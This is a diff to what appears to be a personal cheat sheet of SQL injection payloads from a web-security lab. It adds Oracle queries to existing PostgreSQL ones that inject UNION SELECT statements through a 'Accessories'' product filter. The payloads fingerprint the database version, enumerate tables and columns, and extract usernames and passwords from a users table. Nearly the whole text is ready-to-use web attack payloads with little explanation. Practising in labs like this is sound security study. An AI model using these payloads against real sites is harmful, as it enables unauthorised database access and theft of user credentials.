@@ -25,7 +25,7 @@ Accessories' union select @@version, 'def' --+
 // check posgressql
 Accessories' union select version(), 'def' --+
 
-// PostgreSQL
+// PostgreSQL Contents
 PostgreSQL	
 SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
@@ -39,3 +39,13 @@ Accessories' union select column_name, data_type from information_schema.columns
 Accessories' union select column_name, 'def' from information_schema.columns --+
 
 Accessories' union select username_qsizmn, password_xuavek from users_kuhiqd --+
+
+// Oracle Contents
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Accessories' union select table_name, tablespace_name from all_tables --+
+
+Accessories' union select table_name, tablespace_name from all_tables where tablespace_name='USERS' --+
+
+Accessories' union select column_name, table_name from all_tab_columns where table_name='PRODUCTS' --+
